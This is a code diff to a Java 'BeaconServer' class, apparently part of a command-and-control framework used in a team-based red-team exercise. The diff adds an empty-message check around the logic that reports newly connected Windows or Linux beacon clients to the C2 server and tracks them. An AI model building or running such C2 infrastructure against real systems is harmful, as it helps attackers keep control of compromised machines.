@@ -317,26 +317,27 @@ public class BeaconServer implements Runnable{
                 // 10.a.b.c, where a = team number, b = OS (1 = Windows, 2 = Linux), and c will be the specific host
                 String IPAddress = duplexer.receive();
                 System.out.println("IP Address: " + IPAddress);
-                
-                if(OSMessage.equals("Windows") || OSMessage.equals("Linux")){
-                    // Send message to C2 announcing that a new client has been obtained
-                    C2Handler.sendDataToC2Server("New " + OSMessage + " Client at " + IPAddress);
 
-                    // Create new Beacon Client Handler Thread to handle this connection between the Beacon and the client
-                    BeaconClientHandler clientHandler = new BeaconClientHandler(IPAddress, duplexer, this, OSMessage);
-                    Thread clientHandlerThread = new Thread(clientHandler);
-                    clientHandlerThread.start();
-
-                    // Add to client lists
-                    if(OSMessage.equals("Windows")){
-                        windowsClientObjects.put(IPAddress,clientHandler);
-                        windowsClientResponses.put(IPAddress, new ArrayList<String>());
-                    }else if(OSMessage.equals("Linux")){
-                        linuxClientObjects.put(IPAddress,clientHandler);
-                        linuxClientResponses.put(IPAddress, new ArrayList<String>());
+                if(!(OSMessage.isEmpty())){
+                    if(OSMessage.equals("Windows") || OSMessage.equals("Linux")){
+                        // Send message to C2 announcing that a new client has been obtained
+                        C2Handler.sendDataToC2Server("New " + OSMessage + " Client at " + IPAddress);
+    
+                        // Create new Beacon Client Handler Thread to handle this connection between the Beacon and the client
+                        BeaconClientHandler clientHandler = new BeaconClientHandler(IPAddress, duplexer, this, OSMessage);
+                        Thread clientHandlerThread = new Thread(clientHandler);
+                        clientHandlerThread.start();
+    
+                        // Add to client lists
+                        if(OSMessage.equals("Windows")){
+                            windowsClientObjects.put(IPAddress,clientHandler);
+                            windowsClientResponses.put(IPAddress, new ArrayList<String>());
+                        }else if(OSMessage.equals("Linux")){
+                            linuxClientObjects.put(IPAddress,clientHandler);
+                            linuxClientResponses.put(IPAddress, new ArrayList<String>());
+                        }
                     }
                 }
-                
             } catch(IOException e){
                 e.printStackTrace();
             }
